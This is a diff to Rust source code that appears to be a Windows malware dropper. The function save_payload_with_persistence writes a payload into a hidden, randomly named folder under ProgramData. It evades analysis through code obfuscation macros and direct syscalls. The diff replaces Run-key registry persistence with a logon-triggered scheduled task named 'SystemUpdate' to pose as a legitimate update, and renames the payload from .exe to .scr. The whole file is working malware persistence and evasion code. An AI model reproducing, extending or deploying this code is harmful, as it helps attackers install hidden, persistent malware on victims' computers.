@@ -6,15 +6,19 @@ use std::ffi::OsStr;
 use std::fs;
 use std::iter::once;
 use std::mem;
-use std::os::windows::ffi::OsStrExt;
-use std::path::Path;
 use std::ptr;
-use windows_sys::Win32::Foundation::HANDLE;
-use windows_sys::Win32::Storage::FileSystem::{SetFileAttributesW, FILE_ATTRIBUTE_HIDDEN};
-use windows_sys::Win32::System::Registry::{
-    RegCloseKey, RegOpenKeyExW, RegQueryValueExW, RegSetValueExW, HKEY_CURRENT_USER, KEY_READ,
-    KEY_SET_VALUE, REG_SZ,
+use windows::core::{BSTR, VARIANT};
+use windows::Win32::Foundation::HANDLE;
+use windows::Win32::System::Com::{
+    CoCreateInstance, CoInitializeEx, CoInitializeSecurity, CoUninitialize, CLSCTX_INPROC_SERVER,
+    RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
 };
+use windows::Win32::System::Ole::{VariantClear, VariantInit};
+use windows::Win32::System::TaskScheduler::{
+    ITaskFolder, ITaskService, TaskScheduler, TASK_ACTION_EXEC, TASK_CREATE_OR_UPDATE,
+    TASK_LOGON_INTERACTIVE_TOKEN,
+};
+use windows_sys::Win32::Storage::FileSystem::{SetFileAttributesW, FILE_ATTRIBUTE_HIDDEN};
 
 #[cfg(windows)]
 const FILE_OVERWRITE_IF: u32 = 0x00000005;
@@ -29,102 +33,137 @@ const FILE_ATTRIBUTE_NORMAL: u32 = 0x00000080;
 
 #[cfg(windows)]
 #[obfuscate(garbage = true)]
-unsafe fn add_to_startup(file_path: &str) -> Result<(), String> {
-    let run_key_path: Vec<u16> = OsStr::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
-        .encode_wide()
-        .chain(once(0))
-        .collect();
-    let app_name: Vec<u16> = OsStr::new("SystemUpdate")
-        .encode_wide()
-        .chain(once(0))
-        .collect();
+unsafe fn add_to_task_scheduler(file_path: &str) -> Result<(), String> {
+    if let Err(e) = CoInitializeEx(None, windows::Win32::System::Com::COINIT_MULTITHREADED) {
+        return Err(format!("Failed to initialize COM: {:?}", e));
+    }
 
-    // Check if the startup entry already exists and points to a valid file
-    let mut hkey_read = mem::MaybeUninit::uninit();
-    if RegOpenKeyExW(
-        HKEY_CURRENT_USER,
-        run_key_path.as_ptr(),
+    if let Err(e) = CoInitializeSecurity(
+        None,
+        -1,
+        None,
+        None,
+        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+        RPC_C_IMP_LEVEL_IMPERSONATE,
+        None,
         0,
-        KEY_READ,
-        hkey_read.as_mut_ptr(),
-    ) == 0
-    {
-        let hkey_read = hkey_read.assume_init();
-        let mut data_type = mem::MaybeUninit::uninit();
-        let mut data_size = 0;
+        None,
+    ) {
+        CoUninitialize();
+        return Err(format!("Failed to initialize security: {:?}", e));
+    }
 
-        // First, query the size of the data
-        if RegQueryValueExW(
-            hkey_read,
-            app_name.as_ptr(),
-            ptr::null_mut(),
-            data_type.as_mut_ptr(),
-            ptr::null_mut(),
-            &mut data_size,
-        ) == 0
-        {
-            if data_type.assume_init() == REG_SZ {
-                let mut data_buffer: Vec<u16> = vec![0; (data_size / 2) as usize];
-                if RegQueryValueExW(
-                    hkey_read,
-                    app_name.as_ptr(),
-                    ptr::null_mut(),
-                    ptr::null_mut(),
-                    data_buffer.as_mut_ptr() as *mut u8,
-                    &mut data_size,
-                ) == 0
-                {
-                    // Null bytes might be included, so we need to handle that.
-                    let end = data_buffer
-                        .iter()
-                        .position(|&x| x == 0)
-                        .unwrap_or(data_buffer.len());
-                    let path_str = String::from_utf16_lossy(&data_buffer[..end]);
-                    if Path::new(&path_str).exists() {
-                        RegCloseKey(hkey_read);
-                        // The registry key exists and points to a valid file, so we're done.
-                        return Ok(());
-                    }
-                }
+    let task_service: ITaskService =
+        match CoCreateInstance(&TaskScheduler, None, CLSCTX_INPROC_SERVER) {
+            Ok(service) => service,
+            Err(e) => {
+                CoUninitialize();
+                return Err(format!("Failed to create Task Scheduler instance: {:?}", e));
             }
+        };
+
+    if let Err(e) = task_service.Connect(
+        VARIANT::default(),
+        VARIANT::default(),
+        VARIANT::default(),
+        VARIANT::default(),
+    ) {
+        CoUninitialize();
+        return Err(format!("Failed to connect to Task Scheduler: {:?}", e));
+    }
+
+    let root_folder: ITaskFolder = match task_service.GetFolder(&BSTR::from("\\")) {
+        Ok(folder) => folder,
+        Err(e) => {
+            CoUninitialize();
+            return Err(format!("Failed to get root task folder: {:?}", e));
         }
-        RegCloseKey(hkey_read);
+    };
+
+    let task_definition = match task_service.NewTask(0) {
+        Ok(def) => def,
+        Err(e) => {
+            CoUninitialize();
+            return Err(format!("Failed to create new task definition: {:?}", e));
+        }
+    };
+
+    let principal = match task_definition.Principal() {
+        Ok(p) => p,
+        Err(e) => {
+            CoUninitialize();
+            return Err(format!("Failed to get principal: {:?}", e));
+        }
+    };
+
+    if let Err(e) = principal.SetLogonType(TASK_LOGON_INTERACTIVE_TOKEN) {
+        CoUninitialize();
+        return Err(format!("Failed to set logon type: {:?}", e));
     }
 
-    // If the check fails or the key doesn't exist, proceed to create it.
-    let mut hkey = mem::MaybeUninit::uninit();
+    let triggers = match task_definition.Triggers() {
+        Ok(t) => t,
+        Err(e) => {
+            CoUninitialize();
+            return Err(format!("Failed to get triggers collection: {:?}", e));
+        }
+    };
 
-    if RegOpenKeyExW(
-        HKEY_CURRENT_USER,
-        run_key_path.as_ptr(),
-        0,
-        KEY_SET_VALUE,
-        hkey.as_mut_ptr(),
-    ) != 0
-    {
-        return Err(obfuscate_string!("Failed to open registry key.").to_string());
+    let trigger = match triggers.Create(windows::Win32::System::TaskScheduler::TASK_TRIGGER_LOGON) {
+        Ok(t) => t,
+        Err(e) => {
+            CoUninitialize();
+            return Err(format!("Failed to create logon trigger: {:?}", e));
+        }
+    };
+
+    let action_collection = match task_definition.Actions() {
+        Ok(actions) => actions,
+        Err(e) => {
+            CoUninitialize();
+            return Err(format!("Failed to get action collection: {:?}", e));
+        }
+    };
+
+    let action = match action_collection.Create(TASK_ACTION_EXEC) {
+        Ok(a) => a,
+        Err(e) => {
+            CoUninitialize();
+            return Err(format!("Failed to create exec action: {:?}", e));
+        }
+    };
+
+    let exec_action = match action.cast::<windows::Win32::System::TaskScheduler::IExecAction>() {
+        Ok(a) => a,
+        Err(e) => {
+            CoUninitialize();
+            return Err(format!("Failed to cast to IExecAction: {:?}", e));
+        }
+    };
+
+    if let Err(e) = exec_action.SetPath(&BSTR::from(file_path)) {
+        CoUninitialize();
+        return Err(format!("Failed to set executable path: {:?}", e));
     }
 
-    let hkey = hkey.assume_init();
-    let file_path_w: Vec<u16> = OsStr::new(file_path)
-        .encode_wide()
-        .chain(once(0))
-        .collect();
+    let mut sddl = VARIANT::default();
+    VariantInit(&mut sddl);
 
-    if RegSetValueExW(
-        hkey,
-        app_name.as_ptr(),
-        0,
-        REG_SZ,
-        file_path_w.as_ptr() as *const u8,
-        (file_path_w.len() * 2) as u32,
-    ) != 0
-    {
-        RegCloseKey(hkey);
-        return Err(obfuscate_string!("Failed to set registry value.").to_string());
+    if let Err(e) = root_folder.RegisterTaskDefinition(
+        &BSTR::from("SystemUpdate"),
+        &task_definition,
+        TASK_CREATE_OR_UPDATE.0 as i32,
+        VARIANT::default(), // User
+        VARIANT::default(), // Password
+        TASK_LOGON_INTERACTIVE_TOKEN,
+        sddl,
+    ) {
+        CoUninitialize();
+        return Err(format!("Failed to register task definition: {:?}", e));
     }
 
-    RegCloseKey(hkey);
+    CoUninitialize();
+
     Ok(())
 }
 
@@ -147,7 +186,7 @@ pub unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), S
     let dir_name: String = random_bytes.encode_hex();
 
     let folder_path = format!("{}\\{}", program_data, dir_name);
-    let full_file_path_win = format!("{}\\SystemUpdate.exe", folder_path);
+    let full_file_path_win = format!("{}\\SystemUpdate.scr", folder_path);
 
     if let Err(e) = fs::create_dir_all(&folder_path) {
         return Err(format!(
@@ -237,10 +276,10 @@ pub unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), S
     (syscalls::SYSCALLS.NtClose)(file_handle as *mut _);
 
     if result.is_ok() {
-        if let Err(e) = add_to_startup(&full_file_path_win) {
+        if let Err(e) = add_to_task_scheduler(&full_file_path_win) {
             return Err(format!(
                 "{}{}",
-                obfuscate_string!("Failed to add to startup: "),
+                obfuscate_string!("Failed to add to task scheduler: "),
                 e
             ));
         }
